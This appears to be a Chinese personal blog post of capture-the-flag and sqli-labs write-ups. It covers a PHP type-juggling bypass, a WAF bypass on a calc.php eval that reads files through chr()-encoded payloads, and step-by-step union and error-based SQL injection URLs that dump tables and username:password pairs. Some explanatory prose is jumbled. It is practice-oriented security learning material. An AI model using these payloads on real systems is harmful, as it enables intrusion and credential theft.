<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>歌坛传说 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="@[toc]#backupfiledirsearch -e svn,bak,git -u url获取到一个php文件2023&#x2F;9&#x2F;17 15:31:31    &lt;?php    include_once “flag.php”; if(isset($_GET[&#39;key&#39;])) &amp;#123; $key &#x3D; $_GET[&#39;key&#39;]; if(!i">
<meta property="og:type" content="article">
<meta property="og:title" content="歌坛传说">
<meta property="og:url" content="http://example.com/2023/10/24/fileupback/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="@[toc]#backupfiledirsearch -e svn,bak,git -u url获取到一个php文件2023&#x2F;9&#x2F;17 15:31:31    &lt;?php    include_once “flag.php”; if(isset($_GET[&#39;key&#39;])) &amp;#123; $key &#x3D; $_GET[&#39;key&#39;]; if(!i">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-10-24T01:47:13.831Z">
<meta property="article:modified_time" content="2023-10-24T01:56:24.510Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-fileupback" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/10/24/fileupback/" class="article-date">
  <time class="dt-published" datetime="2023-10-24T01:47:13.831Z" itemprop="datePublished">2023-10-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      歌坛传说
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>@[toc]<br>#backupfile<br>dirsearch -e svn,bak,git -u url<br>获取到一个php文件<br>2023&#x2F;9&#x2F;17 15:31:31<br>    &lt;?php<br>    include_once “flag.php”;</p>
<pre><code>if(isset($_GET[&#39;key&#39;])) &#123;
$key = $_GET[&#39;key&#39;];
if(!is_numeric($key)) &#123;
exit(&quot;Just num!&quot;);
&#125;
$key = intval($key);
$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
if($key == $str) &#123;
echo $flag;
&#125;
&#125;
else &#123;
echo &quot;Try to find out source file!&quot;;
&#125;
 
</code></pre>
<p>is_numberic：看是否传进来的参数是不是整数<br>intval:获取变量的整数值<br>最后利用后端传出flag的值<br>#easy——calc<br>查看计算器发现就是一个普通的计算器而已<br>查看页面源码看看<br> <!--I've set up WAF to ensure security.--><br>    <script><br>    $('#calc').submit(function(){<br>    $.ajax({<br>    url:"calc.php?num="+encodeURIComponent($("#content").val()),<br>    type:'GET',<br>    success:function(data){<br>    $("#result").html(<code>&lt;div class=&quot;alert alert-success&quot;&gt;     &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;     &lt;/div&gt;</code>);<br>    },<br>    error:function(){<br>    alert("这啥?算不来!");<br>    }</p>
<pre><code>&#125;)
return false;
&#125;)
</code></pre>
<p><strong>javascript脚本<br>$('#calc').submit(function(){ ... })：这是一个事件监听器，它监听表单元素的提交事件。具体来说，它监听了表单元素中id为 "calc" 的表单的提交事件。<br>$.ajax({ ... })：这是一个jQuery库中的函数，用于发起AJAX请求。<br>url:"calc.php?num="+encodeURIComponent($("#content").val())：<br>这里设置了AJAX请求的URL。它使用了$("#content").val()来获取id为 "content" 的输入框中的值，然后使用encodeURIComponent函数对其进行编码，并将其作为请求的参数附加到URL后面。这意味着它会将用户在输入框中输入的内容发送给服务器的 "calc.php" 脚本。<br>type:'GET'：指定了HTTP请求的类型，这里是GET请求。<br>success:function(data){ ... }：这是在AJAX请求成功时执行的回调函数。当请求成功时，服务器返回的数据会传递给这个函数，并在函数内部处理。<br>$("#result").html(...)：这里使用jQuery来更新id为 "result" 的元素的HTML内容。它创建了一个包含成功消息的HTML代码块，并将来!"。<br>return false;：这一行代码防止表单的默认提交其插入到 "result" 元素中。<br>error:function(){ ... }：这是在AJAX请求失败时执行的回调函数。如果请求失败，将显示一个警告框，内容为 "这啥?算不行为，因为上述代码使用了AJAX来处理表单的提交，而不是传统的表单提交方式。返回false会取消表单的默认提交操作。<br>总之，这段代码实现了以下功能：<br>当id为 "calc" 的表单提交时，它使用AJAX向服务器发送一个GET请求，将输入框中的值作为参数传递给服务器上的 "calc.php" 脚本。<br>如果请求成功，它将服务器返回的数据显示在id为 "result" 的元素中，显示一个成功的消息。<br>如果请求失败，它会显示一个警告框，内容为 "这啥?算不来!"。<br>最后，它取消了表单的默认提交操作，以确保不会通过传统的方式提交表单。</strong><br>##传参得到php文件：<br>    <?php
    error_reporting(0);
    if(!isset($_GET['num'])){
    show_source(__FILE__);
    }else{
    $str = $_GET['num'];
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
    foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/m', $str)) {
    die("what are you want to do?");
    }
    }
    eval('echo '.$str.';');
    }
    ?><br>encodeURI()着眼于对整个URL进行编码，特殊含义的符号"; / ? : @ & = + $ , #“不进行编码<br>encodeURIComponent()对URL的组成部分进行个别编码，所以”; / ? : @这是看出他设置了waf可能屏蔽了一些东西，同时我们也看出他是以get形式传了num参数上去执行计算，那么这里补充知识点：<br>php语法中，将查询字符串转化为内部$get或者关联数组$POST，例如/?foo=bar变成Array([foo]=> "bar")，查询字符串在解析过程中会将某些字符删除或用下划线替代，因为IDS/IPS或WAF中有一条规则：当news_id参数的值是一个非数字值则拦截，，例如：<br>/news.php?%20news[id%00=42"+AND+1=0–<br>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中<br>1.删除空白符<br>2.将某些字符转换为下划线(包括空格)加空格，使<br>###所以这道题就是因为waf不能让num传递字母，所以我们在num前面得"num"变量变成了" num"变量，而因为上传的字符 会被过滤，所以我们不仅绕过了waf，而且还能上传非法字符，这个时候我们就可以使用phpinfo()查看php版本，和一些过滤，这里发现他过滤了'单引号，不能使用scanf(“/”)，所以用chr(47)绕过，scandir() 列出参数目录中的文件和目录<br>这里使用 num=print_r(scandir(chr(47)));查看目录<br>var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，      通过缩进显示其结构。<br>那么读取到flag目录了就直接访问了<br>? num=print_r(file_get_contents('/flagg'));这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过<br>? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));<br>经过绕过语句：<br>####<a target="_blank" rel="noopener" href="http://node4.buuoj.cn:28743/calc.php?%20num=print_r(scandir(chr(47)));%E5%BE%97%E5%88%B0">http://node4.buuoj.cn:28743/calc.php?%20num=print_r(scandir(chr(47)));得到</a><br>Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1<br>####同理可得构造payload:? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));<br>#BUy-flag<br>##1.请求方式, 请求行中的请求方式需要改为POST</p>
<p>##Content-Type: application/x-www-form-urlencoded</p>
<p>##请求体格式, 请求头和请求体之间有一个请求空行, 也就是一行空内容, 用来分隔请求头和请求体的内容, 如果中间的空行被不小心删掉了或者多了几行空行, 都会出现异常<br>遇到web类题目一般都需要抓包看一看<br>#sqli-1<br>    1.<a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=1">http://sqli-labs-master:8880/Less-1/?id=1</a><br>    ?分隔符，后跟参数<br>    2.<a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=1">http://sqli-labs-master:8880/Less-1/?id=1</a>'<br>    有返回值分析可知后面存在注入，当输入id=1’时页面前端返回值报语法错误，说明后端未处理此数据，插入了sql语句<br>    3. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=1%27--+">http://sqli-labs-master:8880/Less-1/?id=1&#39;--+</a><br>    返回正确<br>    4. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' order by 3--+<br>    5. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' order by 4--+<br>    分析得数据三列，此处参数变成-1’的原因是联系sql语句，返回数据库中的数据。<br>    6. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' union select 1,2,3--+<br>    只有二三列能返回数据<br>    7.<a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' union select 1,version(),database()--+<br>    8.<a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+	<br>    9. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' union select 1,2,group_concat(column_name)  from information_schema.columns where table_name='users'--+<br>    10. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-1/?id=-1">http://sqli-labs-master:8880/Less-1/?id=-1</a>' union select 1,2,group_concat(username,0x3a,password)  from users--+<br>#Sqli_less2<br>    整数型注入同理可得<br>    1. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-2/?id=3">http://sqli-labs-master:8880/Less-2/?id=3</a> order by 3--+<br>    2. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-2/?id=-1">http://sqli-labs-master:8880/Less-2/?id=-1</a> union select 1,database(),version()--+<br>    3. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-2/?id=-1">http://sqli-labs-master:8880/Less-2/?id=-1</a> union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+<br>    4. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-2/?id=-1">http://sqli-labs-master:8880/Less-2/?id=-1</a> union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+<br>    5. <a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-2/?id=-1">http://sqli-labs-master:8880/Less-2/?id=-1</a> union select 1,2,group_concat(username,0x3a,password)from users--+</p>
<h1 id="Sqli-less3"><a href="#Sqli-less3" class="headerlink" title="Sqli-less3"></a>Sqli-less3</h1><p>这道题可以看看返回的错误页面，也可以看看源码php<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-3/?id=1%27)--+">http://sqli-labs-master:8880/Less-3/?id=1&#39;)--+</a><br>其他与前面同理可得<br>#Sqli-less4<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-4/?id=1%22)--+">http://sqli-labs-master:8880/Less-4/?id=1&quot;)--+</a><br>看页面返回的错误<br>其他的同理可得<br>#Sqli-less5<br>第一种思路：<br>仅带入Sql数据进行查询，没有一个合适的数据返回点，这时候可以尝试报错注入<br>extraactvalue函数报错<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-5/?id=1">http://sqli-labs-master:8880/Less-5/?id=1</a>' and extractvalue(null,concat(0x7e,(select database()),0x7e)) --+<br>让后台XML故意报错。<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-5/?id=1">http://sqli-labs-master:8880/Less-5/?id=1</a>' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))--+<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-5/?id=1">http://sqli-labs-master:8880/Less-5/?id=1</a>' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') ,0x7e))--+<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-5/?id=1">http://sqli-labs-master:8880/Less-5/?id=1</a>' and extractvalue(null,concat(0x7e,(select username from users limit 0,1),0x7e)) --+<br><a target="_blank" rel="noopener" href="http://sqli-labs-master:8880/Less-5/?id=1">http://sqli-labs-master:8880/Less-5/?id=1</a>' and extractvalue(null,concat(0x7e,(select password from users limit 0,1),0x7e)) --+<br>第二种：<br>Updatexml(XML_Document,Xpath_string,new_value)包含三个参数</p>
<p>第一个参数:XML_Document是string的格式，为XML文档的对象的名称，例如Doc</p>
<p>第二个参数:XPath_string是路径，Xpath格式的字符串</p>
<p>第三个参数:new_value,string格式，替换查找到的符号条件的数据<br>使用select updatexml,完了之后在使用路径的时候故意将他路径写错，从而引起他的报错。我们在使用也是在报错之前执行一个select的查询，然后等到他报错之后的回显，回显出来 的就是我们想要查看的内容了</p>
<p>注:updatexml和extracevalue一样，都只能查询出来32位的字符串，所以依旧要使用substring的函数<br>and 1=updatexml(1,2,3)</p>
<p>1:第一个参数随便写</p>
<p>2.concat(1,2)</p>
<p>(1):0x7e或者'~'</p>
<p>(2):(select 查询语句)</p>
<p>3.第三个参数也随便写</p>
<p>例: and 1=updatexml(1,concat('~',(select database())),3)<br>and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+<br>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)--+<br>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1)--+</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/10/24/fileupback/" data-id="clo3p8v9w0000kguv683th6y9" data-title="歌坛传说" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/10/24/%E6%96%B0%E6%96%87%E6%A1%A3/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          我的第一er
        
      </div>
    </a>
  
  
    <a href="/2023/08/17/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/10/24/%E6%96%B0%E6%96%87%E6%A1%A3/">我的第一er</a>
          </li>
        
          <li>
            <a href="/2023/10/24/fileupback/">歌坛传说</a>
          </li>
        
          <li>
            <a href="/2023/08/17/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>